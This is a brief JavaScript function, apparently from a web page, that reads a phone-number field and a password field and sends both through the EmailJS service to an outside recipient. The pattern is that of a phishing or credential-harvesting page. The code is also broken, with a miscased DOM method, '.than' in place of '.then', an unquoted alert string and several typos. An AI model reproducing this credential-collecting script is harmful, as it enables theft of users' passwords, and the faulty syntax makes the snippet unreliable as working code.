function sendmail(){
    let parms = {
        number : document.getElementByID("numbe").value,
        password : document.getElementByID("pass").value,
    }
    
    emailjs.send("service_lht9qtb","template_0ywfpk3",parms).than(alert(Email Srnd!))
}

